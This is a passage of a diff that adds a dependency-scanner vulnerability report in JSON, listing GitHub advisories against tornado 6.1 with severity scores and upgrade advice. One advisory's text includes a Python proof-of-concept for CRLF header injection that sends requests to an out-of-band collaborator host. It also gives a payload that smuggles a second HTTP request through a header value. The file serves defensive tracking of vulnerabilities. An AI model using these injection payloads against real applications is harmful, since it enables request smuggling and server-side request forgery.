strategy. \n\n",
+      "recommendation": "Upgrade tornado to version 6.3.3",
+      "advisories": [
+        {
+          "url": "https://github.com/advisories/GHSA-qppv-j76h-2rpx"
+        },
+        {
+          "url": "https://github.com/tornadoweb/tornado"
+        },
+        {
+          "url": "https://github.com/tornadoweb/tornado/commit/b7a5dd29bb02950303ae96055082c12a1ea0a4fe"
+        },
+        {
+          "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-qppv-j76h-2rpx"
+        }
+      ],
+      "affects": [
+        {
+          "ref": "pkg:pypi/tornado@6.1",
+          "versions": [
+            {
+              "version": "6.1",
+              "status": "affected"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "GHSA-w235-7p84-xx57",
+      "source": {
+        "name": "ghsa",
+        "url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "ghsa"
+          },
+          "score": 6.5,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+        }
+      ],
+      "description": "### Summary\nTornado’s `curl_httpclient.CurlAsyncHTTPClient` class is vulnerable to CRLF (carriage return/line feed) injection in the request headers.\n\n### Details\nWhen an HTTP request is sent using `CurlAsyncHTTPClient`, Tornado does not reject carriage return (\\r) or line feed (\\n) characters in the request headers. As a result, if an application includes an attacker-controlled header value in a request sent using `CurlAsyncHTTPClient`, the attacker can inject arbitrary headers into the request or cause the application to send arbitrary requests to the specified server.\n\nThis behavior differs from that of the standard `AsyncHTTPClient` class, which does reject CRLF characters.\n\nThis issue appears to stem from libcurl's (as well as pycurl's) lack of validation for the [`HTTPHEADER`](https://curl.se/libcurl/c/CURLOPT_HTTPHEADER.html) option. libcurl’s documentation states:\n\n> The headers included in the linked list must not be CRLF-terminated, because libcurl adds CRLF after each header item itself. Failure to comply with this might result in strange behavior. libcurl passes on the verbatim strings you give it, without any filter or other safe guards. That includes white space and control characters.\n\npycurl similarly appears to assume that the headers adhere to the correct format. Therefore, without any validation on Tornado’s part, header names and values are included verbatim in the request sent by `CurlAsyncHTTPClient`, including any control characters that have special meaning in HTTP semantics.\n\n### PoC\nThe issue can be reproduced using the following script:\n\n```python\nimport asyncio\n\nfrom tornado import httpclient\nfrom tornado import curl_httpclient\n\nasync def main():\n    http_client = curl_httpclient.CurlAsyncHTTPClient()\n\n    request = httpclient.HTTPRequest(\n        # Burp Collaborator payload\n        \"http://727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com/\",\n        method=\"POST\",\n        body=\"body\",\n        # Injected header using CRLF characters\n        headers={\"Foo\": \"Bar\\r\\nHeader: Injected\"}\n    )\n\n    response = await http_client.fetch(request)\n    print(response.body)\n\n    http_client.close()\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n```\n\nWhen the specified server receives the request, it contains the injected header (`Header: Injected`) on its own line:\n\n```http\nPOST / HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nUser-Agent: Mozilla/5.0 (compatible; pycurl)\nAccept: */*\nAccept-Encoding: gzip,deflate\nFoo: Bar\nHeader: Injected\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\nThe attacker can also construct entirely new requests using a payload with multiple CRLF sequences. For example, specifying a header value of `\\r\\n\\r\\nPOST /attacker-controlled-url HTTP/1.1\\r\\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com` results in the server receiving an additional, attacker-controlled request:\n\n```http\nPOST /attacker-controlled-url HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\n### Impact\nApplications using the Tornado library to send HTTP requests with untrusted header data are affected. This issue may facilitate the exploitation of server-side request forgery (SSRF) vulnerabilities.",
+      "recommendation": "Upgrade tornado to version 6.4.1",
+      "advisories": [
+        {
+          "url": "https://github.com/advisories/GHSA-w235-7p84-xx57"
+        },
+        {
+          "url": "https://github.com/tornadoweb/tornado"
+        },
+        {
+          "url": "https://github.com/tornadoweb/tornado/commit/7786f09f84c9f3f2012c4cf3878417cb9f053669"
+        },
+        {
+          "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-w235-7p84-xx57"
+        }
+      ],
+      "affects": [
+        {
+          "ref": "pkg:pypi/tornado@6.1",
+          "versions": [
+            {
+              "version": "6.1",
+              "status": "affected"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
